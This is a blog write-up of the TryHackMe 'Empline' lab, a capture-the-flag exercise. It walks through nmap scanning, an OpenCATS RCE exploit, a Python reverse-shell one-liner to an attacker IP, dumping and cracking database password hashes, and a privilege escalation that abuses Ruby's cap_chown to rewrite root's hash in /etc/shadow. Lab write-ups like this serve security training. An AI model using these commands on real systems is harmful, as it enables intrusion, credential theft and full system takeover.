---
title: "TryHackMe - Empline"
author: Nasrallah
description: ""
date: 2023-01-13 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, ruby, rce, capability, openssl]
img_path: /assets/img/tryhackme/empline
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Empline](https://tryhackme.com/room/empline) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.216.146                                                                                                                            
Host is up (0.11s latency).                                                                                                                                   
Not shown: 997 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE VERSION                                                                                                                                
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey:                                                                                                                                                
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)                                                                                                
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)                                                                                               
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)                                                                                             
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                                         
|_http-title: Empline
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 85
|   Capabilities flags: 63487
|   Some Capabilities: LongPassword, IgnoreSigpipes, SupportsCompression, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, Support41Auth, In
teractiveClient, Speaks41ProtocolOld, FoundRows, SupportsTransactions, ODBCClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, S
upportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: md1c$#$*E^*TGIv8RskA
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found 3 open ports:

 - 22/tcp    ssh     OpenSSH 7.6p1
 
 - 80/tcp    http    Apache httpd 2.4.29

 - 3306/tcp  mysql   MySQL 5.5.5-10.1.48-MariaDB


We don't have any credentials for ssh and mysql so let's enumerate the http web server.

### Web

Navigate to the web page.

![](1.png)

Nothing interesting in this page, but one of the tabs `employment` goes to `job.empline.thm`. Let's add the two domains to the `/ets/hosts` file.

![](2.png)

Now let's go to http://job.empline.thm/

![](3.png)

We found a login page for `opencats` version 0.9.4 . 


## **Foothold**

I searched on google for available exploit and found this [remote code execution exploit](https://github.com/Nickguitar/RevCAT).

Let's download the exploit and run it.

![](4.png)

Great! We got command execution, now let's get a reverse shell.

First we setup a netcat listener with `nc -lvnp 9001`, then we execute the following command on the target:

```bash
export RHOST="10.11.14.124";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![](5.png)

## **Privilege Escalation**

Checking `opencats` config file i managed to find mysql credentials.

![](6.png)

Let's connect to the database server and see if we can find anything useful.

```bash
www-data@empline:/home$ mysql -u james -p                                                                                                                     
Enter password:                                                                
Welcome to the MariaDB monitor.  Commands end with ; or \g.                    
Your MariaDB connection id is 542                                              
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04                  
                                                                                                                                                              
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                                                                          
                                                                               
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 
                                                                               
MariaDB [(none)]> show databases;                                              
+--------------------+                                                         
| Database           |                                                         
+--------------------+                                                                                                                                        
| information_schema |                                                         
| opencats           |                                                         
+--------------------+                                                         
2 rows in set (0.00 sec)                                                       
                                                                               
MariaDB [(none)]> use opencats;      
Reading table information for completion of table and column names                                                                                            
You can turn off this feature to get a quicker startup with -A                                                                                                
                                                                                                                                                              
Database changed                                                                                                                                              
MariaDB [opencats]> show tables;                                                                                                                              
+--------------------------------------+                                                                                                                      
| Tables_in_opencats                   |                                                                                                                      
+--------------------------------------+
| user                                 |

MariaDB [opencats]> show columns from user;
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |

MariaDB [opencats]> select user_id,user_name,password from user;
+---------+----------------+----------------------------------+
| user_id | user_name      | password                         |
+---------+----------------+----------------------------------+
|       1 | admin          | b67b5ecc5d8902ba59c65596e4c053ec |
|    1250 | cats@rootadmin | cantlogin                        |
|    1251 | george         | 86d0dfda99dbebc424eb4407947356ac |
|    1252 | james          | e53fbdb31890ff3bc129db0e27c473c9 |
+---------+----------------+----------------------------------+
4 rows in set (0.00 sec)

```

We found george password hash that looks like an md5 hash, so we can crack it using [crackstation.net](https://crackstation.net/)

![](7.png)

We got the password, now let's ssh into the machine.

![](8.png)

Next i upload a copy of linpeas and run which gave me the following results:

![](9.png)

We found that `ruby` hash the capability `cap_chown+ep`, which means we can change the ownership of any file.

To get root, we're gonna change the ownership of `/etc/shadow` to george, then change the root's password hash with a new hash that we're gonna create.

```bash
george@empline:~$ ls -l /etc/shadow                                                                                                                           
-rw-r----- 1 root shadow 1081 Jul 20  2021 /etc/shadow
george@empline:~$ /usr/local/bin/ruby -e "require 'fileutils'" -e "FileUtils.chown('george','george','/etc/shadow')"                                          
george@empline:~$ ls -l /etc/shadow                                                                                                                           
-rw-r----- 1 george george 1081 Jul 20  2021 /etc/shadow
george@empline:~$ openssl passwd -6 -salt abc password                                                                                                        
$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0
george@empline:~$ vim /etc/shadow                                                                                                                             
george@empline:~$                                                                                                                                             
george@empline:~$ cat /etc/shadow                                                                                                                             
root:$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0:18828:0:99999:7::: 
<REDACTED>
```

Now we can switch to root with the password `password`.

![](10.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
